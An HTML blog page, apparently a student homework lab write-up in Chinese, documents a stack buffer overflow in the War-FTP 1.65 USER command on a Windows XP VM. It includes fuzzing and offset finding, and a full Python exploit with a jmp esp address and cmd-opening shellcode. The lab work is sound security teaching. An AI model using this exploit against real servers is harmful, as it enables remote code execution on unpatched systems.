@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="bufoverflow,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="war-ftp 缓冲区溢出攻击一、 实验目的 掌握缓冲区溢出的原理  掌握常用的缓冲区溢出方法  理解缓冲区溢出的危害性  掌握防范和避免缓冲区溢出攻击的方法  二、 实验环境 虚拟机 winXP sp3  安装war-ftp 服务器 关闭DEP 安装OllyDBG   主机 mac （攻击方）  12» uname -aDarwin challengedeMacBook-Pro.local 18">
+<meta name="keywords" content="bufoverflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="warftp-exp">
+<meta property="og:url" content="http://yoursite.com/2019/04/29/warftp-exp/index.html">
+<meta property="og:site_name" content="Challenge forever">
+<meta property="og:description" content="war-ftp 缓冲区溢出攻击一、 实验目的 掌握缓冲区溢出的原理  掌握常用的缓冲区溢出方法  理解缓冲区溢出的危害性  掌握防范和避免缓冲区溢出攻击的方法  二、 实验环境 虚拟机 winXP sp3  安装war-ftp 服务器 关闭DEP 安装OllyDBG   主机 mac （攻击方）  12» uname -aDarwin challengedeMacBook-Pro.local 18">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/2-ftp.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/1-ftp.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/29/warftp-exp/12.png">
+<meta property="og:updated_time" content="2019-04-29T07:16:43.255Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="warftp-exp">
+<meta name="twitter:description" content="war-ftp 缓冲区溢出攻击一、 实验目的 掌握缓冲区溢出的原理  掌握常用的缓冲区溢出方法  理解缓冲区溢出的危害性  掌握防范和避免缓冲区溢出攻击的方法  二、 实验环境 虚拟机 winXP sp3  安装war-ftp 服务器 关闭DEP 安装OllyDBG   主机 mac （攻击方）  12» uname -aDarwin challengedeMacBook-Pro.local 18">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/29/warftp-exp/2-ftp.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/29/warftp-exp/">
+
+
+
+
+
+  <title>warftp-exp | Challenge forever</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Challenge forever</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">come on!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/29/warftp-exp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YiXiangTianKai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Challenge forever">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">warftp-exp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-29T15:00:58+08:00">
+                2019-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/homework/" itemprop="url" rel="index">
+                    <span itemprop="name">-homework</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="war-ftp-缓冲区溢出攻击"><a href="#war-ftp-缓冲区溢出攻击" class="headerlink" title="war-ftp 缓冲区溢出攻击"></a>war-ftp 缓冲区溢出攻击</h1><h2 id="一、-实验目的"><a href="#一、-实验目的" class="headerlink" title="一、 实验目的"></a>一、 实验目的</h2><ol>
+<li>掌握缓冲区溢出的原理 </li>
+<li>掌握常用的缓冲区溢出方法 </li>
+<li>理解缓冲区溢出的危害性 </li>
+<li>掌握防范和避免缓冲区溢出攻击的方法</li>
+</ol>
+<h2 id="二、-实验环境"><a href="#二、-实验环境" class="headerlink" title="二、 实验环境"></a>二、 实验环境</h2><ol>
+<li><p>虚拟机 winXP sp3</p>
+<ul>
+<li>安装war-ftp 服务器</li>
+<li>关闭DEP</li>
+<li>安装OllyDBG</li>
+</ul>
+</li>
+<li><p>主机 mac （攻击方）</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">» uname -a</span><br><span class="line">Darwin challengedeMacBook-Pro.local 18.2.0 Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64</span><br></pre></td></tr></table></figure>
+<p> 安装ftp命令</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装</span><br><span class="line">brew install telnet </span><br><span class="line">brew install inetutils </span><br><span class="line">brew link --overwrite inetutils</span><br><span class="line">使用</span><br><span class="line">ftp server-ip</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<ol start="3">
+<li><p>其他</p>
+<ul>
+<li>ActivePerl：提供perl运行环境</li>
+<li>patternCreate.pl：构造不重复的字符</li>
+<li>patternOffset.pl：计算来前者产生的字符串中某段字符的偏移量。</li>
+</ul>
+</li>
+</ol>
+<h2 id="三、-实验内容"><a href="#三、-实验内容" class="headerlink" title="三、 实验内容"></a>三、 实验内容</h2><p>分析war-ftp v1.65的基于用户名的缓冲溢出漏洞。漏洞点：向服务器发送超过480字节的用户名可以触发漏洞（即使用命令USER longString\r\n）。</p>
+<h2 id="四、-详细过程"><a href="#四、-详细过程" class="headerlink" title="四、 详细过程"></a>四、 详细过程</h2><h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>在虚拟机开启 ftp 服务。<br><img src="/2019/04/29/warftp-exp/2-ftp.png" alt="2"></p>
+<blockquote>
+<p>tips:<br>初次打开可能会显示<br><code>War-FTP refuses to restart with the error Unknown format for user database</code><br>解决：删除FtpDaemon.dat 和 FtpDaemon.ini文件 再重新打开即可。<br><img src="/2019/04/29/warftp-exp/1-ftp.png" alt="1"></p>
+</blockquote>
+<p>主机连接ftp，在用户名处输入500个a测试</p>
+<p><img src="/2019/04/29/warftp-exp/3.png" alt="3"><br><img src="/2019/04/29/warftp-exp/4.png" alt="4"></p>
+<p>发现服务器端并没有崩溃，并且显示的字符显然没有500个，查阅资料ftp命令对USER长度有限制，当USER长度超过78个字符时，系统只截取前78个字符发送给目标主机。</p>
+<p>试了几个ftp客户端发现同样会截断，最后选择直接采用socket编程实现发送命令，如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">expftp.py</span><br><span class="line">	</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#create an AF_INET(IPv4), STREAM socket (TCP)</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">except</span> socket.error, msg:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Failed to create socket. Error code: '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' , Error message : '</span> + msg[<span class="number">1</span>]</span><br><span class="line">	sys.exit();</span><br><span class="line"><span class="keyword">print</span> <span class="string">'socket created'</span></span><br><span class="line">	</span><br><span class="line">sock.connect((<span class="string">'10.211.55.13'</span>, <span class="number">21</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Socket Connected to 10.211.55.13'</span></span><br><span class="line">	</span><br><span class="line">s = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b'USER '</span> + <span class="string">b'a'</span> * <span class="number">500</span> + <span class="string">b'\r\n'</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	sock.sendall(payload)</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'send failed'</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">print</span> <span class="string">'message send successfully'</span></span><br><span class="line">	</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>测试 发现程序确实收到字符并且卡住了</p>
+<p><img src="/2019/04/29/warftp-exp/5.png" alt="5"><br><img src="/2019/04/29/warftp-exp/6.png" alt="6"></p>
+<h3 id="od调试-分析栈结构"><a href="#od调试-分析栈结构" class="headerlink" title="od调试 分析栈结构"></a>od调试 分析栈结构</h3><p>为了定位程序溢出时栈中 ret、esp 等的精确位置，这里用 patternCreate.pl 构造1000个不重复的字节。</p>
+<p><img src="/2019/04/29/warftp-exp/7.png" alt="7"><br><img src="/2019/04/29/warftp-exp/8.png" alt="8"></p>
+<p>OD attach 调试</p>
+<p><img src="/2019/04/29/warftp-exp/9.png" alt="9"></p>
+<p>payload 修改之后发送 exp </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test = <span class="string">b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'</span></span><br><span class="line">payload = <span class="string">b'USER '</span> + test + <span class="string">b'\r\n'</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/29/warftp-exp/10.png" alt="10"></p>
+<p>可以看到，此时，esp 为 00B2FD58 该地址内容为71413471，eip 为 32714131。通过patternOffset.pl计算出它在整个长为 1000的字符串中的偏移分别是493和485.</p>
+<p><img src="/2019/04/29/warftp-exp/11.png" alt="11"></p>
+<p>在return指令执行之前 栈的结构如下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |     USERNAME    |</span><br><span class="line">esp, 0x00B2FD50---&gt;+-----------------+</span><br><span class="line">                   |    0x32714131   |</span><br><span class="line">                   +-----------------+</span><br></pre></td></tr></table></figure>
+<p>执行ret之后，0x32714131赋给eip，esp 往后4个字节，指向0x00B2FD58，此时eip执行0x32714131处的指令，显然出错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |                 |</span><br><span class="line">                   |     USERNAME    |</span><br><span class="line">                   +-----------------+</span><br><span class="line">                   |    0x32714131   |                   +-----------------+</span><br><span class="line">                   |                 |</span><br><span class="line">esp, 0x00B2FD58---&gt;+-----------------+</span><br><span class="line">                   |    0x71413471   |</span><br><span class="line">                   +-----------------+</span><br></pre></td></tr></table></figure>
+<h3 id="构造exploit"><a href="#构造exploit" class="headerlink" title="构造exploit"></a>构造exploit</h3><p>如果将0x32714131换成指令jmp esp的地址（0x7ffa4512），再将0x00B2FD58位置的0x71413471填入shellcode，程序在ret之后即执行shellcode。构造如下：在偏移485的位置填入jmp esp指令的地址，偏移493的位置写shellcode，其他填充NOP指令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  0---&gt;+-----------------+</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |     USERNAME    |</span><br><span class="line">485---&gt;+-----------------+</span><br><span class="line">       |    0x7ffa4512   |       +-----------------+</span><br><span class="line">       |                 |</span><br><span class="line">493---&gt;+-----------------+</span><br><span class="line">       |    shellcode    |</span><br><span class="line">       +-----------------+</span><br></pre></td></tr></table></figure>
+<p>完整的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">expftp.py</span><br><span class="line">	</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="comment">#create an AF_INET(IPv4), STREAM socket (TCP)</span></span><br><span class="line">	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">except</span> socket.error, msg:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'Failed to create socket. Error code: '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' , Error message : '</span> + msg[<span class="number">1</span>]</span><br><span class="line">	sys.exit();</span><br><span class="line"><span class="keyword">print</span> <span class="string">'socket created'</span></span><br><span class="line">	</span><br><span class="line">sock.connect((<span class="string">'10.211.55.13'</span>, <span class="number">21</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Socket Connected to 10.211.55.13'</span></span><br><span class="line">	</span><br><span class="line">s = sock.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">	</span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">jmpesp = <span class="string">b'\x12\x45\xfa\x7f'</span></span><br><span class="line"><span class="comment"># len(shellcode) = 111 ; open CMD</span></span><br><span class="line">shellcode = <span class="string">"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"</span>\</span><br><span class="line"><span class="string">"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"</span>\</span><br><span class="line"><span class="string">"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"</span>\</span><br><span class="line"><span class="string">"\x77\x1d\x80\x7c"</span>\</span><br><span class="line"><span class="string">"\x52\x8D\x45\xF4\x50\xFF\x55\xF0"</span>\</span><br><span class="line"><span class="string">"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D\x89\x45\xF4\xB8\x61\x6E\x64\x2E"</span>\</span><br><span class="line"><span class="string">"\x89\x45\xF8\xB8\x63\x6F\x6D\x22\x89\x45\xFC\x33\xD2\x88\x55\xFF\x8D\x45\xF4"</span>\</span><br><span class="line"><span class="string">"\x50\xB8"</span>\</span><br><span class="line"><span class="string">"\xc7\x93\xbf\x77"</span>\</span><br><span class="line"><span class="string">"\xFF\xD0"</span>\</span><br><span class="line"><span class="string">"\x83\xC4\x12\x5D"</span>\</span><br><span class="line">	</span><br><span class="line">payload = <span class="string">b'USER '</span> + <span class="string">b'\x90'</span> * <span class="number">485</span> + jmpesp + <span class="string">b'\x90'</span> * <span class="number">4</span> + shellcode + <span class="string">b'\r\n'</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	sock.sendall(payload)</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'send failed'</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">print</span> <span class="string">'message send successfully'</span></span><br><span class="line">	</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>测试成功，shellcode的功能是打开CMD</p>
+<p><img src="/2019/04/29/warftp-exp/12.png" alt="12"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bufoverflow/" rel="tag"># bufoverflow</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/26/2019-4-26-stackoverfolw/" rel="next" title="stackoverflow">
+                <i class="fa fa-chevron-left"></i> stackoverflow
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">YiXiangTianKai</p>
+              <p class="site-description motion-element" itemprop="description">Here start my blog life! Record something significant in specific!</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#war-ftp-缓冲区溢出攻击"><span class="nav-number">1.</span> <span class="nav-text">war-ftp 缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、-实验目的"><span class="nav-number">1.1.</span> <span class="nav-text">一、 实验目的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、-实验环境"><span class="nav-number">1.2.</span> <span class="nav-text">二、 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、-实验内容"><span class="nav-number">1.3.</span> <span class="nav-text">三、 实验内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、-详细过程"><span class="nav-number">1.4.</span> <span class="nav-text">四、 详细过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证漏洞"><span class="nav-number">1.4.1.</span> <span class="nav-text">验证漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#od调试-分析栈结构"><span class="nav-number">1.4.2.</span> <span class="nav-text">od调试 分析栈结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造exploit"><span class="nav-number">1.4.3.</span> <span class="nav-text">构造exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试结果"><span class="nav-number">1.4.4.</span> <span class="nav-text">测试结果</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YiXiangTianKai</span>
+
+  
